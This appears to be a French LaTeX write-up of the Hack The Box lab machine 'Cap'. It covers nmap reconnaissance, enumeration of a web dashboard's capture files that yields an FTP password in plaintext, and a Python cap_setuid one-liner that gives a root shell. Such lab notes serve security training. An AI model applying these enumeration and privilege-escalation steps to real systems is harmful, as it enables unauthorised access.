\chapter{Cap}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ PORTS=$(sudo nmap -p- -T4 --min-rate=1000 10.10.10.245 |
    grep '^[0-9]' | cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)

$ sudo nmap -sV -sC -p$PORTS 10.10.10.245

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 28 Oct 2022 11:06:02 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 28 Oct 2022 11:05:56 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 28 Oct 2022 11:05:56 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-title: Security Dashboard
|_http-server-header: gunicorn

\end{verbatim}

\subsubsection{http}

Le programme réalise des pacture de packet reel. on le voit si on lance le scan
alors que l'on fait un ftp\ldots

Les fichiers sont sockés dans 
http://10.10.10.245/data/2

on enumere en parant de 0 et dans le 0 on trouve 

\begin{verbatim}
36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!
\end{verbatim}

\subsection{Foothold}
en lançant un linpeas on note 
\begin{verbatim}
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
\end{verbatim}

ce qui parait logique pour pouvoir effectuer les captures de packet.

si on modifie le programme web qui lance les captures de packet il devrait donc
faire des choses en tant que root

\subsubsection{x}

\begin{verbatim}
~$ ls -l /var/www/html/
total 24
drwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__
-rw-r--r-- 1 nathan nathan 4293 May 25  2021 app.py
drwxr-xr-x 6 root   root   4096 May 23  2021 static
drwxr-xr-x 2 root   root   4096 May 23  2021 templates
drwxr-xr-x 2 root   root   4096 Oct 28 15:18 upload
\end{verbatim}

oue mais faudrait pouvoir restart le serveur web.

\begin{verbatim}
$ python3 -c 'import os; os.setuid(0);os.system("/usr/bin/bash")'
nathan@cap:/var/www/html$ python3 -c 'import os; os.setuid(0);os.system("/usr/bin/bash")'
root@cap:/var/www/html# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)


\end{verbatim}
\section{Theorie}


